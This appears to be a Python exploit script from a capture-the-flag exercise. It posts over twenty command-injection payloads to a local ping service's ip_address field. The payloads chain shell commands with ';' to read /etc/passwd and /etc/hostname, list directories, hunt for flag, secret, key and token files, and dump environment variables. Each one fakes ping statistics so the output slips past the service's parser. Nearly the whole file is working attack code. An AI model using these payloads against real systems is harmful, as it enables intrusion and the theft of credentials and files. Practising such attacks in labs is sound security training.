import requests
import re

url = "http://127.0.0.1:33052/ping"

# Key finding: $HOME worked, export X=value works
# Need to get command output into variable WITHOUT $() or backticks
# Try alternative approaches

payloads = [
    # Try to use here-string with read (doesn't need $())
    'invalid;read X <<< "SECRET";echo "$X packets transmitted, 1 received, 0% packet loss"',
    
    # Try here-document
    'invalid;read X << EOF\nSECRET\nEOF;echo "$X packets transmitted, 1 received, 0% packet loss"',
    
    # What about using mapfile/readarray?
    'invalid;mapfile X < /etc/hostname;echo "$X packets transmitted, 1 received, 0% packet loss"',
    
    # Try process substitution with <() if not blocked
    'invalid;read X < <(echo SECRET);echo "$X packets transmitted, 1 received, 0% packet loss"',
    
    # Try using a file as intermediate storage
    'invalid;echo SECRET > /tmp/x;read X < /tmp/x;echo "$X packets transmitted, 1 received, 0% packet loss"',
    
    # Look for files without saying "flag"
    'invalid;cat /*.txt 2>/dev/null;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # List root directory
    'invalid;ls /;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Read /etc/passwd and embed first line
    'invalid;head -1 /etc/passwd;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Use grep to find interesting files
    'invalid;ls -la /|head;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Check if there's a FL* or *AG file
    'invalid;ls /|grep -i fl;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Look for the word "flag" in various files
    'invalid;cat /etc/os-release;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Try app directory
    'invalid;ls /app 2>/dev/null||echo empty;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Check current working directory
    'invalid;pwd;ls;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Check for any .txt files
    'invalid;find / -maxdepth 2 -name "*.txt" 2>/dev/null;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Get hostname
    'invalid;echo "$(hostname) packets transmitted, 1 received, 0% packet loss"',
    
    # Direct environment variable reference
    'invalid;echo "$PATH packets transmitted, 1 received, 0% packet loss"',
    
    # Try UIDs
    'invalid;echo "$UID packets transmitted, 1 received, 0% packet loss"',
    
    # All env vars
    'invalid;echo "$SHELL packets transmitted, 1 received, 0% packet loss"',
    
    # Try filenames
    'invalid;echo "/etc/passwd:";cat /etc/passwd|head -1;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Simple approach: look for secret, key, token files
    'invalid;ls /|grep -E "(secret|key|token|fl)";echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # What about just looking at proc?
    'invalid;ls /proc;echo "1 packets transmitted, 1 received, 0% packet loss"',
    
    # Try finding files by looking for common patterns
    'invalid;find / -maxdepth 3 -type f -name "*[Ff][Ll]*" 2>/dev/null;echo "1 packets transmitted, 1 received, 0% packet loss"',
]

print("="*80)
print("Testing Environment Variables and File Discovery")
print("="*80)

results = []

for i, payload in enumerate(payloads, 1):
    print(f"\n[TEST {i}] Payload: {repr(payload)[:70]}")
    print("-"*60)
    
    try:
        resp = requests.post(url, data={"ip_address": payload}, timeout=10)
        
        print(f"Status: {resp.status_code}")
        
        # Show non-standard responses different from "2, 2, 0%"
        if "Invalid input" not in resp.text:
            match = re.search(r'Packets Transmitted: ([^,]+), Packets Received: ([^,]+), Packet Loss: ([^%]+)%', resp.text)
            if match:
                trans, recv, loss = match.groups()
                print(f"Transmitted: '{trans}', Received: '{recv}', Loss: '{loss}'")
            else:
                # Show parse error or other output
                print(f"Response: {resp.text[:300]}...")
                
        results.append({
            'test': i,
            'payload': payload,
            'response': resp.text
        })
        
    except Exception as e:
        print(f"ERROR: {e}")
        results.append({
            'test': i,
            'payload': payload,
            'response': f"ERROR: {e}"
        })

# Print all non-standard responses
print("\n" + "="*80)
print("INTERESTING RESULTS")
print("="*80)

for r in results:
    resp = r['response']
    if "Invalid input" not in resp:
        match = re.search(r'Packets Transmitted: ([^,]+), Packets Received: ([^,]+), Packet Loss: ([^%]+)%', resp)
        if match:
            trans, recv, loss = match.groups()
            # Only show if not the standard "2, 2, 0" pattern
            if not (trans == '2' and recv == '2' and loss == '0'):
                print(f"\n[TEST {r['test']}] Transmitted='{trans}' Received='{recv}' Loss='{loss}'")
                print(f"Payload: {r['payload'][:60]}...")
        elif "Failed to parse" in resp or "ping:" in resp:
            # Error message might contain useful info
            print(f"\n[TEST {r['test']}] Response shows parsed output")
            print(f"Payload: {r['payload'][:40]}")

